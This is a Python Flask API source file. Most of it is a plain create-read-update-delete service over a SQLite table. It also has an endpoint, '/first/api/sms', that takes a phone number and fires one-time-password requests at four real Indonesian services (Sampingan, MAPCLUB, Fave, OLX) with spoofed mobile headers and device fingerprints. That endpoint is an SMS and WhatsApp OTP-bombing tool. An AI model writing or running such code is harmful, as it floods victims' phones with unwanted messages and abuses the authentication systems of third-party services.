import re
from urllib import response
from flask import Flask,request
from flask_restful import Resource, Api
from flask_cors import CORS
from flask_sqlalchemy import SQLAlchemy
from fake_useragent import UserAgent
import os,requests,json

app=Flask(__name__)
api=Api(app)

CORS(app)

db = SQLAlchemy(app)

basedir=os.path.dirname(os.path.abspath(__file__))
database="sqlite:///" + os.path.join(basedir,"db.sqlite")
app.config["SQLALCHEMY_DATABASE_URI"] = database

class ViewData(db.Model):
    id=db.Column(db.Integer,primary_key=True)
    nama=db.Column(db.String(100))
    umur=db.Column(db.Integer)
    token=db.Column(db.TEXT)

    def save(self):
        try:
            db.session.add(self)
            db.session.commit()
            return True
        except:
            return False

db.create_all()

identitas={}

class TestingSource(Resource):
    def get(self):
        #response={"msg":"Success Build Rest Api"}
        useragent=UserAgent()
        ua=useragent.random
        query=ViewData.query.all()
        output=[
            ({
                "id":data.id,
                "nama":data.nama,
                "umur":data.umur,
                "token":data.token
            }) 
            for data in query
        ]
        response=({
            "code" : 200,
            "mssg" : "Query data success",
            "data" : output
        })
        return response, 200

    def post(self):
        dataNama=request.form["nama"]
        dataUmur=request.form["umur"]
        dataToken=request.form["token"]

        model=ViewData(nama=dataNama,umur=dataUmur,token=dataToken)
        model.save()

        response=({
            "msg" : "Success add data",
            "code": 200
        })
        return response, 200
    def delete(self):
        query=ViewData.query.all()
        for data in query:
            db.session.delete(data)
            db.session.commit()

        response={
            "mssg": "Success delete all data",
            "reponse code": 200
        }

        return response, 200


class UpdateSource(Resource):
    def put(self,id):
        query=ViewData.query.get(id)
        editNama = request.form["nama"]
        editUmur=request.form["umur"]
        editToken=request.form["token"]

        query.nama = editNama
        query.umur = editUmur
        query.token = editToken

        response={
            "mssg": "Success Edit Data",
            "code": 200
        }

        return response

    def delete(self,id):
        queryData=ViewData.query.get(id)

        db.session.delete(queryData)
        db.session.commit()

        response={
            "mssg": "Success delete data",
            "code": 200
        }

        return response

class RandomUa(Resource):
    def get(self):
        useragent=UserAgent()
        ua=useragent.random
        return ({
            "user-agent": ua,
            "response code": 200,
            "creator": "Ammar-Excuted"
        })

class SpamSource(Resource):
    def post(self):
        nomor=request.form.get('nomor')
        if not nomor:
             return (
             {
                "mssg": "error",
                "respon": "masukkan nomor dengan benar.",
                "code": 404
             }
        )
        req=requests.post("https://auth.sampingan.co/v1/otp",data=json.dumps({"channel":"WA","country_code":"+62","phone_number":nomor}),headers={"Host":"auth.sampingan.co","domain-name":"auth-svc","app-auth":"Skip","content-type":"application/json; charset=UTF-8","user-agent":"okhttp/4.9.1","accept":"application/vnd.full+json","accept":"application/json","content-type":"application/vnd.full+json","content-type":"application/json","app-version":"2.1.2","app-platform":"Android"}).text
        p=requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"account":nomor})).text
        pos=requests.post("https://api.myfave.com/api/fave/v3/auth",headers={'Host':'api.myfave.com','Connection':'keep-alive','Content-Length':'26','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','x-user-agent':'Fave-PWA/v1.0.0','content-type':'application/json','sec-ch-ua-mobile':'?1','User-Agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','Accept':'*/*','Origin':'https://myfave.com','Sec-Fetch-Site':'same-site','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty','Referer':'https://myfave.com/','Accept-Encoding':'gzip, deflate, br','Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"phone":"+62"+nomor})).text
        AmmarGanz=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
        if "success" in p and req and AmmarGanz:
             return (
             {
                "mssg": "success",
                "respon": "subscribe channel ammar executed.",
                "code": 200
             }
        )
        else:
             return (
             {
                "mssg": "limited code please wait 1 hours",
                "respon": "subscribe channel ammar executed",
                "code": 404
             }
        )

api.add_resource(TestingSource, "/first", methods=["GET", "POST", "DELETE"])
api.add_resource(UpdateSource, "/first/<id>", methods=["PUT","DELETE"])
api.add_resource(RandomUa, "/first/api/user-agent", methods=["GET"])
api.add_resource(SpamSource, "/first/api/sms")

if __name__ == "__main__":
    app.run(debug=True, port=5005)
